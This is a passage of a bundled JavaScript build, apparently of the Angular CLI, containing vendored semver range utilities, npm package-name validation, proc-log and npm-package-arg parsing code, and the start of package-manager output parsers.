        return minver;
      }
      minver = new SemVer("0.0.0-0");
      if (range.test(minver)) {
        return minver;
      }
      minver = null;
      for (let i = 0; i < range.set.length; ++i) {
        const comparators = range.set[i];
        let setMin = null;
        comparators.forEach((comparator) => {
          const compver = new SemVer(comparator.semver.version);
          switch (comparator.operator) {
            case ">":
              if (compver.prerelease.length === 0) {
                compver.patch++;
              } else {
                compver.prerelease.push(0);
              }
              compver.raw = compver.format();
            /* fallthrough */
            case "":
            case ">=":
              if (!setMin || gt(compver, setMin)) {
                setMin = compver;
              }
              break;
            case "<":
            case "<=":
              break;
            /* istanbul ignore next */
            default:
              throw new Error(`Unexpected operation: ${comparator.operator}`);
          }
        });
        if (setMin && (!minver || gt(minver, setMin))) {
          minver = setMin;
        }
      }
      if (minver && range.test(minver)) {
        return minver;
      }
      return null;
    };
    module2.exports = minVersion;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/valid.js
var require_valid2 = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/valid.js"(exports2, module2) {
    "use strict";
    var Range = require_range();
    var validRange = (range, options) => {
      try {
        return new Range(range, options).range || "*";
      } catch (er) {
        return null;
      }
    };
    module2.exports = validRange;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/outside.js
var require_outside = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/outside.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var Comparator = require_comparator();
    var { ANY } = Comparator;
    var Range = require_range();
    var satisfies = require_satisfies();
    var gt = require_gt();
    var lt = require_lt();
    var lte = require_lte();
    var gte = require_gte();
    var outside = (version, range, hilo, options) => {
      version = new SemVer(version, options);
      range = new Range(range, options);
      let gtfn, ltefn, ltfn, comp, ecomp;
      switch (hilo) {
        case ">":
          gtfn = gt;
          ltefn = lte;
          ltfn = lt;
          comp = ">";
          ecomp = ">=";
          break;
        case "<":
          gtfn = lt;
          ltefn = gte;
          ltfn = gt;
          comp = "<";
          ecomp = "<=";
          break;
        default:
          throw new TypeError('Must provide a hilo val of "<" or ">"');
      }
      if (satisfies(version, range, options)) {
        return false;
      }
      for (let i = 0; i < range.set.length; ++i) {
        const comparators = range.set[i];
        let high = null;
        let low = null;
        comparators.forEach((comparator) => {
          if (comparator.semver === ANY) {
            comparator = new Comparator(">=0.0.0");
          }
          high = high || comparator;
          low = low || comparator;
          if (gtfn(comparator.semver, high.semver, options)) {
            high = comparator;
          } else if (ltfn(comparator.semver, low.semver, options)) {
            low = comparator;
          }
        });
        if (high.operator === comp || high.operator === ecomp) {
          return false;
        }
        if ((!low.operator || low.operator === comp) && ltefn(version, low.semver)) {
          return false;
        } else if (low.operator === ecomp && ltfn(version, low.semver)) {
          return false;
        }
      }
      return true;
    };
    module2.exports = outside;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/gtr.js
var require_gtr = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/gtr.js"(exports2, module2) {
    "use strict";
    var outside = require_outside();
    var gtr = (version, range, options) => outside(version, range, ">", options);
    module2.exports = gtr;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/ltr.js
var require_ltr = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/ltr.js"(exports2, module2) {
    "use strict";
    var outside = require_outside();
    var ltr = (version, range, options) => outside(version, range, "<", options);
    module2.exports = ltr;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/intersects.js
var require_intersects = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/intersects.js"(exports2, module2) {
    "use strict";
    var Range = require_range();
    var intersects = (r1, r2, options) => {
      r1 = new Range(r1, options);
      r2 = new Range(r2, options);
      return r1.intersects(r2, options);
    };
    module2.exports = intersects;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/simplify.js
var require_simplify = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/simplify.js"(exports2, module2) {
    "use strict";
    var satisfies = require_satisfies();
    var compare2 = require_compare();
    module2.exports = (versions, range, options) => {
      const set = [];
      let first = null;
      let prev = null;
      const v = versions.sort((a, b) => compare2(a, b, options));
      for (const version of v) {
        const included = satisfies(version, range, options);
        if (included) {
          prev = version;
          if (!first) {
            first = version;
          }
        } else {
          if (prev) {
            set.push([first, prev]);
          }
          prev = null;
          first = null;
        }
      }
      if (first) {
        set.push([first, null]);
      }
      const ranges = [];
      for (const [min, max] of set) {
        if (min === max) {
          ranges.push(min);
        } else if (!max && min === v[0]) {
          ranges.push("*");
        } else if (!max) {
          ranges.push(`>=${min}`);
        } else if (min === v[0]) {
          ranges.push(`<=${max}`);
        } else {
          ranges.push(`${min} - ${max}`);
        }
      }
      const simplified = ranges.join(" || ");
      const original = typeof range.raw === "string" ? range.raw : String(range);
      return simplified.length < original.length ? simplified : range;
    };
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/subset.js
var require_subset = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/subset.js"(exports2, module2) {
    "use strict";
    var Range = require_range();
    var Comparator = require_comparator();
    var { ANY } = Comparator;
    var satisfies = require_satisfies();
    var compare2 = require_compare();
    var subset = (sub, dom, options = {}) => {
      if (sub === dom) {
        return true;
      }
      sub = new Range(sub, options);
      dom = new Range(dom, options);
      let sawNonNull = false;
      OUTER: for (const simpleSub of sub.set) {
        for (const simpleDom of dom.set) {
          const isSub = simpleSubset(simpleSub, simpleDom, options);
          sawNonNull = sawNonNull || isSub !== null;
          if (isSub) {
            continue OUTER;
          }
        }
        if (sawNonNull) {
          return false;
        }
      }
      return true;
    };
    var minimumVersionWithPreRelease = [new Comparator(">=0.0.0-0")];
    var minimumVersion = [new Comparator(">=0.0.0")];
    var simpleSubset = (sub, dom, options) => {
      if (sub === dom) {
        return true;
      }
      if (sub.length === 1 && sub[0].semver === ANY) {
        if (dom.length === 1 && dom[0].semver === ANY) {
          return true;
        } else if (options.includePrerelease) {
          sub = minimumVersionWithPreRelease;
        } else {
          sub = minimumVersion;
        }
      }
      if (dom.length === 1 && dom[0].semver === ANY) {
        if (options.includePrerelease) {
          return true;
        } else {
          dom = minimumVersion;
        }
      }
      const eqSet = /* @__PURE__ */ new Set();
      let gt, lt;
      for (const c of sub) {
        if (c.operator === ">" || c.operator === ">=") {
          gt = higherGT(gt, c, options);
        } else if (c.operator === "<" || c.operator === "<=") {
          lt = lowerLT(lt, c, options);
        } else {
          eqSet.add(c.semver);
        }
      }
      if (eqSet.size > 1) {
        return null;
      }
      let gtltComp;
      if (gt && lt) {
        gtltComp = compare2(gt.semver, lt.semver, options);
        if (gtltComp > 0) {
          return null;
        } else if (gtltComp === 0 && (gt.operator !== ">=" || lt.operator !== "<=")) {
          return null;
        }
      }
      for (const eq of eqSet) {
        if (gt && !satisfies(eq, String(gt), options)) {
          return null;
        }
        if (lt && !satisfies(eq, String(lt), options)) {
          return null;
        }
        for (const c of dom) {
          if (!satisfies(eq, String(c), options)) {
            return false;
          }
        }
        return true;
      }
      let higher, lower;
      let hasDomLT, hasDomGT;
      let needDomLTPre = lt && !options.includePrerelease && lt.semver.prerelease.length ? lt.semver : false;
      let needDomGTPre = gt && !options.includePrerelease && gt.semver.prerelease.length ? gt.semver : false;
      if (needDomLTPre && needDomLTPre.prerelease.length === 1 && lt.operator === "<" && needDomLTPre.prerelease[0] === 0) {
        needDomLTPre = false;
      }
      for (const c of dom) {
        hasDomGT = hasDomGT || c.operator === ">" || c.operator === ">=";
        hasDomLT = hasDomLT || c.operator === "<" || c.operator === "<=";
        if (gt) {
          if (needDomGTPre) {
            if (c.semver.prerelease && c.semver.prerelease.length && c.semver.major === needDomGTPre.major && c.semver.minor === needDomGTPre.minor && c.semver.patch === needDomGTPre.patch) {
              needDomGTPre = false;
            }
          }
          if (c.operator === ">" || c.operator === ">=") {
            higher = higherGT(gt, c, options);
            if (higher === c && higher !== gt) {
              return false;
            }
          } else if (gt.operator === ">=" && !c.test(gt.semver)) {
            return false;
          }
        }
        if (lt) {
          if (needDomLTPre) {
            if (c.semver.prerelease && c.semver.prerelease.length && c.semver.major === needDomLTPre.major && c.semver.minor === needDomLTPre.minor && c.semver.patch === needDomLTPre.patch) {
              needDomLTPre = false;
            }
          }
          if (c.operator === "<" || c.operator === "<=") {
            lower = lowerLT(lt, c, options);
            if (lower === c && lower !== lt) {
              return false;
            }
          } else if (lt.operator === "<=" && !c.test(lt.semver)) {
            return false;
          }
        }
        if (!c.operator && (lt || gt) && gtltComp !== 0) {
          return false;
        }
      }
      if (gt && hasDomLT && !lt && gtltComp !== 0) {
        return false;
      }
      if (lt && hasDomGT && !gt && gtltComp !== 0) {
        return false;
      }
      if (needDomGTPre || needDomLTPre) {
        return false;
      }
      return true;
    };
    var higherGT = (a, b, options) => {
      if (!a) {
        return b;
      }
      const comp = compare2(a.semver, b.semver, options);
      return comp > 0 ? a : comp < 0 ? b : b.operator === ">" && a.operator === ">=" ? b : a;
    };
    var lowerLT = (a, b, options) => {
      if (!a) {
        return b;
      }
      const comp = compare2(a.semver, b.semver, options);
      return comp < 0 ? a : comp > 0 ? b : b.operator === "<" && a.operator === "<=" ? b : a;
    };
    module2.exports = subset;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/index.js
var require_semver2 = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/index.js"(exports2, module2) {
    "use strict";
    var internalRe = require_re();
    var constants = require_constants();
    var SemVer = require_semver();
    var identifiers = require_identifiers();
    var parse = require_parse();
    var valid3 = require_valid();
    var clean = require_clean();
    var inc = require_inc();
    var diff = require_diff();
    var major = require_major();
    var minor = require_minor();
    var patch = require_patch();
    var prerelease = require_prerelease();
    var compare2 = require_compare();
    var rcompare = require_rcompare();
    var compareLoose = require_compare_loose();
    var compareBuild = require_compare_build();
    var sort = require_sort();
    var rsort = require_rsort();
    var gt = require_gt();
    var lt = require_lt();
    var eq = require_eq();
    var neq = require_neq();
    var gte = require_gte();
    var lte = require_lte();
    var cmp = require_cmp();
    var coerce = require_coerce();
    var truncate = require_truncate();
    var Comparator = require_comparator();
    var Range = require_range();
    var satisfies = require_satisfies();
    var toComparators = require_to_comparators();
    var maxSatisfying2 = require_max_satisfying();
    var minSatisfying = require_min_satisfying();
    var minVersion = require_min_version();
    var validRange = require_valid2();
    var outside = require_outside();
    var gtr = require_gtr();
    var ltr = require_ltr();
    var intersects = require_intersects();
    var simplifyRange = require_simplify();
    var subset = require_subset();
    module2.exports = {
      parse,
      valid: valid3,
      clean,
      inc,
      diff,
      major,
      minor,
      patch,
      prerelease,
      compare: compare2,
      rcompare,
      compareLoose,
      compareBuild,
      sort,
      rsort,
      gt,
      lt,
      eq,
      neq,
      gte,
      lte,
      cmp,
      coerce,
      truncate,
      Comparator,
      Range,
      satisfies,
      toComparators,
      maxSatisfying: maxSatisfying2,
      minSatisfying,
      minVersion,
      validRange,
      outside,
      gtr,
      ltr,
      intersects,
      simplifyRange,
      subset,
      SemVer,
      re: internalRe.re,
      src: internalRe.src,
      tokens: internalRe.t,
      SEMVER_SPEC_VERSION: constants.SEMVER_SPEC_VERSION,
      RELEASE_TYPES: constants.RELEASE_TYPES,
      compareIdentifiers: identifiers.compareIdentifiers,
      rcompareIdentifiers: identifiers.rcompareIdentifiers
    };
  }
});

// node_modules/.pnpm/validate-npm-package-name@8.0.0/node_modules/validate-npm-package-name/lib/builtin-modules.json
var require_builtin_modules = __commonJS({
  "node_modules/.pnpm/validate-npm-package-name@8.0.0/node_modules/validate-npm-package-name/lib/builtin-modules.json"(exports2, module2) {
    module2.exports = ["_http_agent", "_http_client", "_http_common", "_http_incoming", "_http_outgoing", "_http_server", "_stream_duplex", "_stream_passthrough", "_stream_readable", "_stream_transform", "_stream_wrap", "_stream_writable", "_tls_common", "_tls_wrap", "assert", "assert/strict", "async_hooks", "buffer", "child_process", "cluster", "console", "constants", "crypto", "dgram", "diagnostics_channel", "dns", "dns/promises", "domain", "events", "fs", "fs/promises", "http", "http2", "https", "inspector", "inspector/promises", "module", "net", "os", "path", "path/posix", "path/win32", "perf_hooks", "process", "punycode", "querystring", "readline", "readline/promises", "repl", "stream", "stream/consumers", "stream/promises", "stream/web", "string_decoder", "sys", "timers", "timers/promises", "tls", "trace_events", "tty", "url", "util", "util/types", "v8", "vm", "wasi", "worker_threads", "zlib", "node:sea", "node:sqlite", "node:test", "node:test/reporters"];
  }
});

// node_modules/.pnpm/validate-npm-package-name@8.0.0/node_modules/validate-npm-package-name/lib/index.js
var require_lib2 = __commonJS({
  "node_modules/.pnpm/validate-npm-package-name@8.0.0/node_modules/validate-npm-package-name/lib/index.js"(exports2, module2) {
    "use strict";
    var builtins = require_builtin_modules();
    var scopedPackagePattern = new RegExp("^(?:@([^/]+?)[/])?([^/]+?)$");
    var exclusionList = [
      "node_modules",
      "favicon.ico"
    ];
    function validate(name) {
      var warnings = [];
      var errors = [];
      if (name === null) {
        errors.push("name cannot be null");
        return done(warnings, errors);
      }
      if (name === void 0) {
        errors.push("name cannot be undefined");
        return done(warnings, errors);
      }
      if (typeof name !== "string") {
        errors.push("name must be a string");
        return done(warnings, errors);
      }
      if (!name.length) {
        errors.push("name length must be greater than zero");
      }
      if (name.startsWith(".")) {
        errors.push("name cannot start with a period");
      }
      if (name.startsWith("-")) {
        errors.push("name cannot start with a hyphen");
      }
      if (name.match(/^_/)) {
        errors.push("name cannot start with an underscore");
      }
      if (name.trim() !== name) {
        errors.push("name cannot contain leading or trailing spaces");
      }
      exclusionList.forEach(function(excludedName) {
        if (name.toLowerCase() === excludedName) {
          errors.push(excludedName + " is not a valid package name");
        }
      });
      if (builtins.includes(name.toLowerCase())) {
        warnings.push(name + " is a core module name");
      }
      if (name.length > 214) {
        warnings.push("name can no longer contain more than 214 characters");
      }
      if (name.toLowerCase() !== name) {
        warnings.push("name can no longer contain capital letters");
      }
      if (/[~'!()*]/.test(name.split("/").slice(-1)[0])) {
        warnings.push(`name can no longer contain special characters ("~'!()*")`);
      }
      if (encodeURIComponent(name) !== name) {
        var nameMatch = name.match(scopedPackagePattern);
        if (nameMatch) {
          var user = nameMatch[1];
          var pkg = nameMatch[2];
          if (pkg.startsWith(".")) {
            errors.push("name cannot start with a period");
          }
          if (encodeURIComponent(user) === user && encodeURIComponent(pkg) === pkg) {
            return done(warnings, errors);
          }
        }
        errors.push("name can only contain URL-friendly characters");
      }
      return done(warnings, errors);
    }
    var done = function(warnings, errors) {
      var result = {
        validForNewPackages: errors.length === 0 && warnings.length === 0,
        validForOldPackages: errors.length === 0,
        warnings,
        errors
      };
      if (!result.warnings.length) {
        delete result.warnings;
      }
      if (!result.errors.length) {
        delete result.errors;
      }
      return result;
    };
    module2.exports = validate;
  }
});

// node_modules/.pnpm/proc-log@7.0.0/node_modules/proc-log/lib/index.js
var require_lib3 = __commonJS({
  "node_modules/.pnpm/proc-log@7.0.0/node_modules/proc-log/lib/index.js"(exports2, module2) {
    var META = /* @__PURE__ */ Symbol("proc-log.meta");
    module2.exports = {
      META,
      output: {
        LEVELS: [
          "standard",
          "error",
          "buffer",
          "flush"
        ],
        KEYS: {
          standard: "standard",
          error: "error",
          buffer: "buffer",
          flush: "flush"
        },
        standard: function(...args) {
          return process.emit("output", "standard", ...args);
        },
        error: function(...args) {
          return process.emit("output", "error", ...args);
        },
        buffer: function(...args) {
          return process.emit("output", "buffer", ...args);
        },
        flush: function(...args) {
          return process.emit("output", "flush", ...args);
        }
      },
      log: {
        LEVELS: [
          "notice",
          "error",
          "warn",
          "info",
          "verbose",
          "http",
          "silly",
          "timing",
          "pause",
          "resume"
        ],
        KEYS: {
          notice: "notice",
          error: "error",
          warn: "warn",
          info: "info",
          verbose: "verbose",
          http: "http",
          silly: "silly",
          timing: "timing",
          pause: "pause",
          resume: "resume"
        },
        error: function(...args) {
          return process.emit("log", "error", ...args);
        },
        notice: function(...args) {
          return process.emit("log", "notice", ...args);
        },
        warn: function(...args) {
          return process.emit("log", "warn", ...args);
        },
        info: function(...args) {
          return process.emit("log", "info", ...args);
        },
        verbose: function(...args) {
          return process.emit("log", "verbose", ...args);
        },
        http: function(...args) {
          return process.emit("log", "http", ...args);
        },
        silly: function(...args) {
          return process.emit("log", "silly", ...args);
        },
        timing: function(...args) {
          return process.emit("log", "timing", ...args);
        },
        pause: function() {
          return process.emit("log", "pause");
        },
        resume: function() {
          return process.emit("log", "resume");
        }
      },
      time: {
        LEVELS: [
          "start",
          "end"
        ],
        KEYS: {
          start: "start",
          end: "end"
        },
        start: function(name, fn) {
          process.emit("time", "start", name);
          function end() {
            return process.emit("time", "end", name);
          }
          if (typeof fn === "function") {
            const res = fn();
            if (res && res.finally) {
              return res.finally(end);
            }
            end();
            return res;
          }
          return end;
        },
        end: function(name) {
          return process.emit("time", "end", name);
        }
      },
      input: {
        LEVELS: [
          "start",
          "end",
          "read"
        ],
        KEYS: {
          start: "start",
          end: "end",
          read: "read"
        },
        start: function(...args) {
          let fn;
          if (typeof args[0] === "function") {
            fn = args.shift();
          }
          process.emit("input", "start", ...args);
          function end() {
            return process.emit("input", "end", ...args);
          }
          if (typeof fn === "function") {
            const res = fn();
            if (res && res.finally) {
              return res.finally(end);
            }
            end();
            return res;
          }
          return end;
        },
        end: function(...args) {
          return process.emit("input", "end", ...args);
        },
        read: function(...args) {
          let resolve2, reject;
          const promise = new Promise((_resolve, _reject) => {
            resolve2 = _resolve;
            reject = _reject;
          });
          process.emit("input", "read", resolve2, reject, ...args);
          return promise;
        }
      }
    };
  }
});

// node_modules/.pnpm/npm-package-arg@14.0.0/node_modules/npm-package-arg/lib/npa.js
var require_npa = __commonJS({
  "node_modules/.pnpm/npm-package-arg@14.0.0/node_modules/npm-package-arg/lib/npa.js"(exports2, module2) {
    "use strict";
    var isWindows = process.platform === "win32";
    var { URL: URL2 } = require("node:url");
    var path = isWindows ? require("node:path/win32") : require("node:path");
    var { homedir } = require("node:os");
    var HostedGit = require_lib();
    var semver = require_semver2();
    var validatePackageName = require_lib2();
    var { log: log2 } = require_lib3();
    var hasSlashes = isWindows ? /\\|[/]/ : /[/]/;
    var isURL = /^(?:git[+])?[a-z]+:/i;
    var isGit = /^[^@]+@[^:.]+\.[^:]+:.+$/i;
    var isFileType = /[.](?:tgz|tar\.gz|tar)$/i;
    var isPortNumber = /:[0-9]+(\/|$)/i;
    var isWindowsFile = /^(?:[.]|~[/]|[/\\]|[a-zA-Z]:)/;
    var isPosixFile = /^(?:[.]|~[/]|[/]|[a-zA-Z]:)/;
    var defaultRegistry = "https://registry.npmjs.org";
    function npa2(arg, where) {
      let name;
      let spec;
      if (typeof arg === "object") {
        if (arg instanceof Result && (!where || where === arg.where)) {
          return arg;
        } else if (arg.name && arg.rawSpec) {
          return npa2.resolve(arg.name, arg.rawSpec, where || arg.where);
        } else {
          return npa2(arg.raw, where || arg.where);
        }
      }
      const nameEndsAt = arg.indexOf("@", 1);
      const namePart = nameEndsAt > 0 ? arg.slice(0, nameEndsAt) : arg;
      if (isURL.test(arg)) {
        spec = arg;
      } else if (isGit.test(arg)) {
        spec = `git+ssh://${arg}`;
      } else if (!namePart.startsWith("@") && (hasSlashes.test(namePart) || isFileType.test(namePart))) {
        spec = arg;
      } else if (nameEndsAt > 0) {
        name = namePart;
        spec = arg.slice(nameEndsAt + 1) || "*";
      } else {
        const valid3 = validatePackageName(arg);
        if (valid3.validForOldPackages) {
          name = arg;
          spec = "*";
        } else {
          spec = arg;
        }
      }
      return resolve2(name, spec, where, arg);
    }
    function isFileSpec(spec) {
      if (!spec) {
        return false;
      }
      if (spec.toLowerCase().startsWith("file:")) {
        return true;
      }
      if (isWindows) {
        return isWindowsFile.test(spec);
      }
      return isPosixFile.test(spec);
    }
    function isAliasSpec(spec) {
      if (!spec) {
        return false;
      }
      return spec.toLowerCase().startsWith("npm:");
    }
    function resolve2(name, spec, where, arg) {
      const res = new Result({
        raw: arg,
        name,
        rawSpec: spec,
        fromArgument: arg != null
      });
      if (name) {
        res.name = name;
      }
      if (!where) {
        where = process.cwd();
      }
      if (isFileSpec(spec)) {
        return fromFile(res, where);
      } else if (isAliasSpec(spec)) {
        return fromAlias(res, where);
      }
      const hosted = HostedGit.fromUrl(spec, {
        noGitPlus: true,
        noCommittish: true
      });
      if (hosted) {
        return fromHostedGit(res, hosted);
      } else if (spec && isURL.test(spec)) {
        return fromURL(res);
      } else if (spec && (hasSlashes.test(spec) || isFileType.test(spec))) {
        return fromFile(res, where);
      } else {
        return fromRegistry(res);
      }
    }
    function toPurl(arg, reg = defaultRegistry) {
      const res = npa2(arg);
      if (res.type !== "version") {
        throw invalidPurlType(res.type, res.raw);
      }
      let purl = "pkg:npm/" + res.name.replace(/^@/, "%40") + "@" + res.rawSpec;
      if (reg !== defaultRegistry) {
        purl += "?repository_url=" + reg;
      }
      return purl;
    }
    function invalidPackageName(name, valid3, raw) {
      const err = new Error(`Invalid package name "${name}" of package "${raw}": ${valid3.errors.join("; ")}.`);
      err.code = "EINVALIDPACKAGENAME";
      return err;
    }
    function invalidTagName(name, raw) {
      const err = new Error(`Invalid tag name "${name}" of package "${raw}": Tags may not have any characters that encodeURIComponent encodes.`);
      err.code = "EINVALIDTAGNAME";
      return err;
    }
    function invalidPurlType(type, raw) {
      const err = new Error(`Invalid type "${type}" of package "${raw}": Purl can only be generated for "version" types.`);
      err.code = "EINVALIDPURLTYPE";
      return err;
    }
    var Result = class {
      constructor(opts) {
        this.type = opts.type;
        this.registry = opts.registry;
        this.where = opts.where;
        if (opts.raw == null) {
          this.raw = opts.name ? `${opts.name}@${opts.rawSpec}` : opts.rawSpec;
        } else {
          this.raw = opts.raw;
        }
        this.name = void 0;
        this.escapedName = void 0;
        this.scope = void 0;
        this.rawSpec = opts.rawSpec || "";
        this.saveSpec = opts.saveSpec;
        this.fetchSpec = opts.fetchSpec;
        if (opts.name) {
          this.setName(opts.name);
        }
        this.gitRange = opts.gitRange;
        this.gitCommittish = opts.gitCommittish;
        this.gitSubdir = opts.gitSubdir;
        this.hosted = opts.hosted;
      }
      // TODO move this to a getter/setter in a semver major
      setName(name) {
        const valid3 = validatePackageName(name);
        if (!valid3.validForOldPackages) {
          throw invalidPackageName(name, valid3, this.raw);
        }
        this.name = name;
        this.scope = name[0] === "@" ? name.slice(0, name.indexOf("/")) : void 0;
        this.escapedName = name.replace("/", "%2f");
        return this;
      }
      toString() {
        const full = [];
        if (this.name != null && this.name !== "") {
          full.push(this.name);
        }
        const spec = this.saveSpec || this.fetchSpec || this.rawSpec;
        if (spec != null && spec !== "") {
          full.push(spec);
        }
        return full.length ? full.join("@") : this.raw;
      }
      toJSON() {
        const result = Object.assign({}, this);
        delete result.hosted;
        return result;
      }
    };
    function setGitAttrs(res, committish) {
      if (!committish) {
        res.gitCommittish = null;
        return;
      }
      for (const part of committish.split("::")) {
        if (!part.includes(":")) {
          if (res.gitRange) {
            throw new Error("cannot override existing semver range with a committish");
          }
          if (res.gitCommittish) {
            throw new Error("cannot override existing committish with a second committish");
          }
          res.gitCommittish = part;
          continue;
        }
        const [name, value] = part.split(":");
        if (name === "semver") {
          if (res.gitCommittish) {
            throw new Error("cannot override existing committish with a semver range");
          }
          if (res.gitRange) {
            throw new Error("cannot override existing semver range with a second semver range");
          }
          res.gitRange = decodeURIComponent(value);
          continue;
        }
        if (name === "path") {
          if (res.gitSubdir) {
            throw new Error("cannot override existing path with a second path");
          }
          res.gitSubdir = `/${value}`;
          continue;
        }
        log2.warn("npm-package-arg", `ignoring unknown key "${name}"`);
      }
    }
    var encodedPathChars = /* @__PURE__ */ new Map([
      ["\0", "%00"],
      ["	", "%09"],
      ["\n", "%0A"],
      ["\r", "%0D"],
      [" ", "%20"],
      ['"', "%22"],
      ["#", "%23"],
      ["%", "%25"],
      ["?", "%3F"],
      ["[", "%5B"],
      ["\\", isWindows ? "/" : "%5C"],
      ["]", "%5D"],
      ["^", "%5E"],
      ["|", "%7C"],
      ["~", "%7E"]
    ]);
    function pathToFileURL(str) {
      let result = "";
      for (let i = 0; i < str.length; i++) {
        result = `${result}${encodedPathChars.get(str[i]) ?? str[i]}`;
      }
      if (result.startsWith("file:")) {
        return result;
      }
      return `file:${result}`;
    }
    function fromFile(res, where) {
      res.type = isFileType.test(res.rawSpec) ? "file" : "directory";
      res.where = where;
      let rawSpec = pathToFileURL(res.rawSpec);
      if (rawSpec.startsWith("file:/")) {
        if (/^file:\/\/[^/]/.test(rawSpec)) {
          rawSpec = `file:/${rawSpec.slice(5)}`;
        }
        if (/^\/{1,3}\.\.?(\/|$)/.test(rawSpec.slice(5))) {
          rawSpec = rawSpec.replace(/^file:\/{1,3}/, "file:");
        }
      }
      let resolvedUrl;
      let specUrl;
      try {
        resolvedUrl = new URL2(rawSpec, `${pathToFileURL(path.resolve(where))}/`);
        specUrl = new URL2(rawSpec);
      } catch (originalError) {
        const er = new Error("Invalid file: URL, must comply with RFC 8089");
        throw Object.assign(er, {
          raw: res.rawSpec,
          spec: res,
          where,
          originalError
        });
      }
      let specPath = decodeURIComponent(specUrl.pathname);
      let resolvedPath = decodeURIComponent(resolvedUrl.pathname);
      if (isWindows) {
        specPath = specPath.replace(/^\/+([a-z]:\/)/i, "$1");
        resolvedPath = resolvedPath.replace(/^\/+([a-z]:\/)/i, "$1");
      }
      if (/^\/~(\/|$)/.test(specPath)) {
        res.saveSpec = `file:${specPath.substr(1)}`;
        resolvedPath = path.resolve(homedir(), specPath.substr(3));
      } else if (!path.isAbsolute(rawSpec.slice(5))) {
        res.saveSpec = `file:${path.relative(where, resolvedPath)}`;
      } else {
        res.saveSpec = `file:${path.resolve(resolvedPath)}`;
      }
      res.fetchSpec = path.resolve(where, resolvedPath);
      res.saveSpec = res.saveSpec.split("\\").join("/");
      if (res.saveSpec.startsWith("file://")) {
        res.saveSpec = `file:/${res.saveSpec.slice(7)}`;
      }
      return res;
    }
    function fromHostedGit(res, hosted) {
      res.type = "git";
      res.hosted = hosted;
      res.saveSpec = hosted.toString({ noGitPlus: false, noCommittish: false });
      res.fetchSpec = hosted.getDefaultRepresentation() === "shortcut" ? null : hosted.toString();
      setGitAttrs(res, hosted.committish);
      return res;
    }
    function unsupportedURLType(protocol, spec) {
      const err = new Error(`Unsupported URL Type "${protocol}": ${spec}`);
      err.code = "EUNSUPPORTEDPROTOCOL";
      return err;
    }
    function fromURL(res) {
      let rawSpec = res.rawSpec;
      res.saveSpec = rawSpec;
      if (rawSpec.startsWith("git+ssh:")) {
        const matched = rawSpec.match(/^git\+ssh:\/\/([^:#]+:[^#]+(?:\.git)?)(?:#(.*))?$/i);
        if (matched && !matched[1].match(isPortNumber)) {
          res.type = "git";
          setGitAttrs(res, matched[2]);
          res.fetchSpec = matched[1];
          return res;
        }
      } else if (rawSpec.startsWith("git+file://")) {
        rawSpec = rawSpec.replace(/\\/g, "/");
      }
      const parsedUrl = new URL2(rawSpec);
      switch (parsedUrl.protocol) {
        case "git:":
        case "git+http:":
        case "git+https:":
        case "git+rsync:":
        case "git+ftp:":
        case "git+file:":
        case "git+ssh:":
          res.type = "git";
          setGitAttrs(res, parsedUrl.hash.slice(1));
          if (parsedUrl.protocol === "git+file:" && /^git\+file:\/\/[a-z]:/i.test(rawSpec)) {
            res.fetchSpec = `git+file://${parsedUrl.host.toLowerCase()}:${parsedUrl.pathname}`;
          } else {
            parsedUrl.hash = "";
            res.fetchSpec = parsedUrl.toString();
          }
          if (res.fetchSpec.startsWith("git+")) {
            res.fetchSpec = res.fetchSpec.slice(4);
          }
          break;
        case "http:":
        case "https:":
          res.type = "remote";
          res.fetchSpec = res.saveSpec;
          break;
        default:
          throw unsupportedURLType(parsedUrl.protocol, rawSpec);
      }
      return res;
    }
    function fromAlias(res, where) {
      const subSpec = npa2(res.rawSpec.substr(4), where);
      if (subSpec.type === "alias") {
        throw new Error("nested aliases not supported");
      }
      if (!subSpec.registry) {
        throw new Error("aliases only work for registry deps");
      }
      if (!subSpec.name) {
        throw new Error("aliases must have a name");
      }
      res.subSpec = subSpec;
      res.registry = true;
      res.type = "alias";
      res.saveSpec = null;
      res.fetchSpec = null;
      return res;
    }
    function fromRegistry(res) {
      res.registry = true;
      const spec = res.rawSpec.trim();
      res.saveSpec = null;
      res.fetchSpec = spec;
      const version = semver.valid(spec, true);
      const range = semver.validRange(spec, true);
      if (version) {
        res.type = "version";
      } else if (range) {
        res.type = "range";
      } else {
        if (encodeURIComponent(spec) !== spec) {
          throw invalidTagName(spec, res.raw);
        }
        res.type = "tag";
      }
      return res;
    }
    module2.exports = npa2;
    module2.exports.resolve = resolve2;
    module2.exports.toPurl = toPurl;
    module2.exports.Result = Result;
  }
});

// packages/angular/cli/src/package-managers/parsers.ts
function logStdout(stdout, logger) {
  if (!logger) {
    return;
  }
  let output = stdout;
  if (output.length > MAX_LOG_LENGTH) {
    output = `${output.slice(0, MAX_LOG_LENGTH)}... (truncated)`;
  }
  logger.debug(`  stdout:
${output}`);
}
function* parseJsonLines(output, logger) {
  for (const line of output.split("\n")) {
    if (!line.trim()) {
      continue;
    }
    try {
      yield JSON.parse(line);
    } catch (e) {
      logger?.debug(`  Ignoring non-JSON line: ${e}`);
    }
  }
}
function parseNpmLikeDependencies(stdout, logger, options) {
  logger?.debug(`Parsing npm-like dependency list...`);
  logStdout(stdout, logger);
  const dependencies = /* @__PURE__ */ new Map();
  if (!stdout) {
    logger?.debug("  stdout is empty. No dependencies found.");
    return dependencies;
  }
  const data = JSON.parse(stdout);
  const workspacePackageName = options?.workspacePackageName;
  let rootProject;
